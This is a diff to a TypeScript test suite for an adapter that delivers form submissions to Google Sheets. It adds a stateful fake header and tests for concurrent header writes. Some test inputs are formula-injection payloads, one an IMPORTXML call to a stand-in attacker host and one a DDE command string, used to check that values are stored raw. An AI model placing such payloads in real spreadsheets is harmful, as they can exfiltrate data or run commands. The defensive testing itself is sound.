@@ -52,7 +52,7 @@ import {
   redactConfig,
 } from "../src/lib/destinations/config.ts";
 import { buildPayload, sampleSource } from "../src/lib/destinations/payload.ts";
-import type { SubmissionPayload } from "../src/lib/destinations/types.ts";
+import { RETRYABLE_FAILURES, type SubmissionPayload } from "../src/lib/destinations/types.ts";
 
 let pass = 0;
 let fail = 0;
@@ -86,7 +86,7 @@ type Call = { url: string; method: string; body: string; headers: Record<string,
  * so a test that forgot a handler fails on an assertion it can read.
  */
 function fakeGoogle(
-  handlers: { match: (call: Call) => boolean; status: number; body: unknown }[],
+  handlers: Handler[],
 ) {
   const calls: Call[] = [];
   const impl = (async (url: string | URL | Request, init?: RequestInit) => {
@@ -104,7 +104,8 @@ function fakeGoogle(
     calls.push(call);
     const handler = handlers.find((candidate) => candidate.match(call));
     if (!handler) return new Response("no handler", { status: 599 });
-    const body = typeof handler.body === "string" ? handler.body : JSON.stringify(handler.body);
+    const raw = typeof handler.body === "function" ? handler.body(call) : handler.body;
+    const body = typeof raw === "string" ? raw : JSON.stringify(raw);
     return new Response(body, {
       status: handler.status,
       headers: { "content-type": "application/json" },
@@ -113,7 +114,53 @@ function fakeGoogle(
   return { impl, calls };
 }
 
+type Handler = {
+  match: (call: Call) => boolean;
+  status: number;
+  /** A fixed answer, or one computed from the request for a fake with state. */
+  body: unknown | ((call: Call) => unknown);
+};
+
 const isToken = (call: Call) => call.url === GOOGLE_TOKEN_ENDPOINT;
+
+/** The 0-based column a range like `'Leads'!C1` starts at. */
+function startColumn(call: Call): number {
+  const letters = /!([A-Z]+)1(?:\?|$)/.exec(decodeURIComponent(new URL(call.url).pathname))?.[1] ?? "A";
+  return [...letters].reduce((n, letter) => n * 26 + (letter.charCodeAt(0) - 64), 0) - 1;
+}
+
+/**
+ * A header row with state: reads return what writes put there. Needed since
+ * the adapter reads the header back after writing it (security review M2) — a
+ * fake that answered every read with the same canned header would make every
+ * write look lost. `onWrite` runs after each write, so a test can play the part
+ * of a second delivery overwriting the cell in between.
+ */
+function liveHeader(initial: string[], onWrite?: (header: string[], writes: number) => void) {
+  const state = { header: [...initial], writes: 0 };
+  const handlers: Handler[] = [
+    {
+      match: (call) => call.url.startsWith("https://sheets.googleapis.com/") && call.method === "GET" && decodeURIComponent(call.url).includes("!1:1"),
+      status: 200,
+      body: () => (state.header.length > 0 ? { values: [state.header] } : { range: "Leads!A1:Z1" }),
+    },
+    {
+      match: (call) => call.url.startsWith("https://sheets.googleapis.com/") && call.method === "PUT",
+      status: 200,
+      body: (call: Call) => {
+        const cells = (JSON.parse(call.body) as { values: string[][] }).values[0];
+        const start = startColumn(call);
+        cells.forEach((cell, offset) => {
+          state.header[start + offset] = cell;
+        });
+        state.writes++;
+        onWrite?.(state.header, state.writes);
+        return { updatedCells: cells.length };
+      },
+    },
+  ];
+  return { state, handlers };
+}
 
 /** An unsigned JWT with the claims we read. The signature is never checked. */
 function idToken(claims: Record<string, unknown>): string {
@@ -762,15 +809,14 @@ async function delivery() {
     // An empty tab: header written, then the row.
     const first = await deliver([
       tokenOk,
-      { match: isSheets("GET", "!1:1"), status: 200, body: { range: "Leads!A1:Z1" } },
-      { match: isSheets("PUT", "!A1"), status: 200, body: { updatedCells: 7 } },
+      ...liveHeader([]).handlers,
       appendOk,
     ]);
     ok("an empty tab is delivered to", first.result.ok, first.result);
     t(
-      "token, header, header write, append — in that order",
+      "token, header, header write, header read-back, append — in that order",
       first.calls.map((call) => call.method),
-      ["POST", "GET", "PUT", "POST"],
+      ["POST", "GET", "PUT", "GET", "POST"],
     );
     const hosts = new Set(first.calls.map((call) => new URL(call.url).host));
     t("and nothing but Google was asked", [...hosts].sort(), ["oauth2.googleapis.com", "sheets.googleapis.com"]);
@@ -782,7 +828,7 @@ async function delivery() {
       "the spreadsheet is the one configured",
       first.calls.slice(1).every((call) => call.url.includes(`/spreadsheets/${SHEET_ID}/values/`)),
     );
-    const append = first.calls[3];
+    const append = first.calls[4];
     ok("values are written RAW, never parsed as formulas", append?.url.includes("valueInputOption=RAW") ?? false, append?.url);
     ok("as new rows, not over existing ones", append?.url.includes("insertDataOption=INSERT_ROWS") ?? false);
     t(
@@ -809,7 +855,7 @@ async function delivery() {
 
     // M3, through the adapter: the schema reaches the planner.
     const schemaDelivery = await deliver(
-      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: {} }, { match: isSheets("PUT", "!A1"), status: 200, body: {} }, appendOk],
+      [tokenOk, ...liveHeader([]).handlers, appendOk],
       { declaredFields: ["name"] },
     );
     ok("a schema endpoint delivers", schemaDelivery.result.ok, schemaDelivery.result);
@@ -838,7 +884,7 @@ async function delivery() {
     );
 
     const formula = await deliver(
-      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: {} }, { match: isSheets("PUT", "!A1"), status: 200, body: {} }, appendOk],
+      [tokenOk, ...liveHeader([]).handlers, appendOk],
       { payload: payload({ company: '=IMPORTXML("https://evil.example","//secret")' }) },
     );
     ok(
@@ -849,7 +895,7 @@ async function delivery() {
 
     // M5 for a header name and for attribution, which arrives in a query string.
     const hostileNames = await deliver(
-      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: {} }, { match: isSheets("PUT", "!A1"), status: 200, body: {} }, appendOk],
+      [tokenOk, ...liveHeader([]).handlers, appendOk],
       {
         payload: buildPayload(
           { ...sampleSource({ publicId: "ep", name: "x" }), values: { "=cmd|' /C calc'!A0": "x" }, utmSource: "@SUM(1+1)" },
@@ -867,7 +913,7 @@ async function delivery() {
 
     // A tab name that is hostile to A1 notation and to a URL path both.
     const odd = await deliver(
-      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: { values: [["Submitted at"]] } }, { match: isSheets("PUT", "!B1"), status: 200, body: {} }, appendOk],
+      [tokenOk, ...liveHeader(["Submitted at"]).handlers, appendOk],
       { config: { ...storedConfig, sheetName: "Priya's / leads?#" } },
     );
     ok("a tab with quotes and slashes is delivered to", odd.result.ok, odd.result);
@@ -948,6 +994,69 @@ async function failures() {
   });
 }
 
+async function headerRace() {
+  console.log("\ntwo deliveries adding columns at once (M2)");
+
+  await withEnv(CLIENT, async () => {
+    const ours3 = ["Submitted at", "Origin", "Submission ID"];
+
+    // Deterministic: right after our first header write, another delivery
+    // overwrites the same cell with its own new column.
+    const raced = liveHeader(ours3, (header, writes) => {
+      if (writes === 1) header[3] = "phone";
+    });
+    const lost = await deliver([tokenOk, ...raced.handlers, appendOk], {
+      payload: payload({ company: "Dorset Metal" }, { utm: false }),
+    });
+    ok("a delivery whose header write was overwritten still delivers", lost.result.ok, lost.result);
+    const appended: unknown[] = JSON.parse(lost.calls.at(-1)?.body ?? "{}").values?.[0] ?? [];
+    t("its column was written again, after the one that won", raced.state.header, [...ours3, "phone", "company"]);
+    t("so its value lands under its own name", appended[4], "Dorset Metal");
+    t("and not under the other delivery's", appended[3], "");
+    t(
+      "with one extra read-back, and no append until the header held",
+      lost.calls.map((call) => call.method),
+      ["POST", "GET", "PUT", "GET", "PUT", "GET", "POST"],
+    );
+
+    // Two real deliveries, interleaved through one shared header. Each fake
+    // call resolves immediately, so their awaits alternate.
+    const shared = liveHeader(ours3);
+    const appends: unknown[][] = [];
+    const recordAppend: Handler = {
+      match: isSheets("POST", ":append"),
+      status: 200,
+      body: (call: Call) => {
+        appends.push((JSON.parse(call.body) as { values: unknown[][] }).values[0]);
+        return { updates: { updatedRows: 1 } };
+      },
+    };
+    const [a, b] = await Promise.all([
+      deliver([tokenOk, ...shared.handlers, recordAppend], { payload: payload({ company: "A Co" }, { utm: false }) }),
+      deliver([tokenOk, ...shared.handlers, recordAppend], { payload: payload({ phone: "0123" }, { utm: false }) }),
+    ]);
+    ok("both interleaved deliveries succeed", a.result.ok && b.result.ok, [a.result.error, b.result.error]);
+    const header = shared.state.header;
+    t("and the header holds both new columns", [...header].sort(), [...ours3, "company", "phone"].sort());
+    const companyRow = appends.find((row) => row.includes("A Co")) ?? [];
+    const phoneRow = appends.find((row) => row.includes("0123")) ?? [];
+    t("A's value is under company", companyRow[header.indexOf("company")], "A Co");
+    t("B's value is under phone", phoneRow[header.indexOf("phone")], "0123");
+
+    // A header that never holds: bounded, and nothing appended.
+    const churning = liveHeader(ours3, (h) => {
+      h[h.length - 1] = `someone-else-${Math.random()}`;
+    });
+    const gaveUp = await deliver([tokenOk, ...churning.handlers, appendOk], {
+      payload: payload({ company: "C Co" }, { utm: false }),
+    });
+    ok("a header that keeps moving fails the delivery", !gaveUp.result.ok);
+    ok("as retryable", gaveUp.result.failure !== null && RETRYABLE_FAILURES.has(gaveUp.result.failure), gaveUp.result.failure);
+    ok("after a bounded number of tries", churning.state.writes === 3, churning.state.writes);
+    ok("and nothing was appended", !gaveUp.calls.some((call) => call.url.includes(":append")));
+  });
+}
+
 async function retries() {
   console.log("\nretries do not duplicate rows");
 
@@ -1001,6 +1110,7 @@ async function main() {
   await rows();
   await delivery();
   await failures();
+  await headerRace();
   await retries();
 
   console.log(`\n${pass} passed, ${fail} failed`);
